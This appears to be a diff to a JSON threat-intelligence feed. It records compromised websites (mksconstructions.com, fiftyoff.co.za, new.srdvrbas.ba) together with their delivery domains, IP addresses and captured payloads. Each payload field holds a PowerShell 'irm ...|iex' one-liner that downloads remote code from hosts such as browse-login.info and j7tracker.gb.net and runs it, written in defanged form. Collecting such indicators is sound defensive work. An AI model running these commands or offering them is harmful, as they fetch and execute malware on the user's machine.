@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "mksconstructions.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/a0ab86b89832a232",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/a0ab86b89832a232'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/a0ab86b89832a232"
+    ],
+    "ReportId": "cmww6dan60g7a0nml31wlxszd",
+    "ScannedAt": "2026-11-25T13:44:20.329000+00:00"
+  },
+  {
     "UrlDomain": "xplortravel.co",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -4855,43 +4877,5 @@
     ],
     "ReportId": "cmwnpfpw41x2g0oml742g5tyb",
     "ScannedAt": "2026-11-19T15:28:10.392000+00:00"
-  },
-  {
-    "UrlDomain": "fiftyoff.co.za",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "IP": [
-      "41.204.202.6"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "ReportId": "cmwnlp7zj1wzj0omlkec6jirx",
-    "ScannedAt": "2026-11-19T13:43:35.418000+00:00"
-  },
-  {
-    "UrlDomain": "new.srdvrbas.ba",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "IP": [
-      "65.21.234.24"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "ReportId": "cmwnlotyh1wyr0omlqyh8e3xl",
-    "ScannedAt": "2026-11-19T13:43:17.240000+00:00"
   }
 ]
